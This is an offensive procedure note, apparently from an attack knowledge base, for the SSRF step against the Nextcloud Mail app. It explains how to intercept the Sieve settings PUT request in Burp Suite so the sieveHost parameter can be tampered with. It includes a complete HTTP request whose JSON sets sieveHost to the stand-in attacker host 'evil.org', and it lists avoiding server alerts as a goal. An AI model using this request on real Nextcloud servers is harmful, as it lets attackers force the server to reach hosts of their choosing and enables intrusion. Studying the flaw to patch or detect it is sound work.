---
id: proc-nextcloud-intercept-put-sieve
tags:
  - ssrf
  - intercept
  - burp
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/PUT-Sieve-Account-Update]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:09.883Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Intercept-PUT-Request-for-Sieve-Configuration

## Summary

This procedure intercepts the PUT request sent to update Sieve settings in the Nextcloud Mail app, allowing inspection and modification of the vulnerable sieveHost parameter.

## Description

The Nextcloud Mail app sends a PUT request to /apps/mail/api/sieve/account/{id} with a JSON payload including sieveEnabled, sieveHost, sievePort, sieveUser, sievePassword, and sieveSslMode. Intercepting this request via a proxy like Burp Suite enables the attacker to view and alter parameters for SSRF exploitation. This step assumes the mailbox and Sieve settings navigation from the prior procedure.

## Requirements

1. Burp Suite running as a proxy, with browser traffic routed through it.
2. Authenticated session triggering the PUT request.
3. Knowledge of the account ID (e.g., 5) from the mailbox setup.

## Defense

Defensive measures and detection strategies:

- Implement request validation at the API level to log or block proxied traffic anomalies.
- Use WAF rules to detect interception patterns or unusual delays in request handling.

## Objectives

1. Capture the exact JSON payload for Sieve update.
2. Identify modifiable parameters like sieveHost.
3. Prepare for payload tampering without alerting the server.

## Instructions

### Step 1: Configure Proxy and Trigger Request

**Context**: Set up interception and save Sieve settings to capture the PUT request.

Execute [[commands/PUT-Sieve-Account-Update]] (intercepted form):

```http
PUT /apps/mail/api/sieve/account/5 HTTP/2
Host: redacted
Cookie: redacted
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/plain, */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Requesttoken: redacted
Content-Length: 117
Origin: redacted
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"sieveEnabled":true,"sieveHost":"evil.org","sievePort":"80","sieveUser":"","sievePassword":"","sieveSslMode":"none"}
```

> In Burp, set the request as intercepted; forward after inspection. Expected: Full request details visible.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/PUT-Sieve-Account-Update]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- ssrf
- put-request
- interception
